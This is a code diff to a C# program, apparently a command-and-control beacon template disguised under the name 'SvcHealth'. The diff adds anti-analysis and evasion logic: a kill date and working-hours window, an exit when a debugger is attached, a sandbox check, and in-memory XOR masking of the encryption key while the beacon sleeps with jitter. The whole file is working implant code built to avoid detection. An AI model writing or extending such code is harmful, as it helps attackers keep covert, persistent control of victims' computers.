@@ -189,24 +189,51 @@ namespace SvcHealth
             return commands;
         }
 
+        const int KillDate = {{KILL_DATE}};
+        const int WorkStart = {{WORK_START}};
+        const int WorkEnd = {{WORK_END}};
+
+        static void StealthSleep(int ms)
+        {
+            var secret = Encoding.UTF8.GetBytes(EncKey);
+            var key = new byte[16];
+            RandomNumberGenerator.Fill(key);
+            for (int i = 0; i < secret.Length; i++) secret[i] ^= key[i % key.Length];
+            Thread.Sleep(Math.Max(1, ms));
+            for (int i = 0; i < secret.Length; i++) secret[i] ^= key[i % key.Length];
+            Array.Clear(key, 0, key.Length);
+        }
+
+        static void WaitWindow()
+        {
+            while (true)
+            {
+                if (Debugger.IsAttached) Environment.Exit(0);
+                var now = DateTime.UtcNow;
+                int today = now.Year * 10000 + now.Month * 100 + now.Day;
+                if (KillDate > 0 && today > KillDate) Environment.Exit(0);
+                if (WorkEnd <= WorkStart || WorkEnd >= 24 || (now.Hour >= WorkStart && now.Hour < WorkEnd)) return;
+                Thread.Sleep(60000);
+            }
+        }
+
         static void SleepWithJitter()
         {
             var rng = new Random();
+            int sleepMs = BeaconSleep * 1000;
             if (BeaconJitter > 0 && BeaconJitter <= 100)
             {
                 var jitterRange = BeaconSleep * BeaconJitter / 100.0;
-                var sleepMs = (int)((BeaconSleep + (rng.NextDouble() * 2 - 1) * jitterRange) * 1000);
-                Thread.Sleep(Math.Max(1000, sleepMs));
+                sleepMs = (int)((BeaconSleep + (rng.NextDouble() * 2 - 1) * jitterRange) * 1000);
             }
-            else
-            {
-                Thread.Sleep(BeaconSleep * 1000);
-            }
+            WaitWindow();
+            StealthSleep(Math.Max(1000, sleepMs));
         }
 
         static void Main(string[] args)
         {
             // Sandbox check
+            WaitWindow();
             if (Environment.ProcessorCount < 2) Thread.Sleep(30000);
 
             // Register
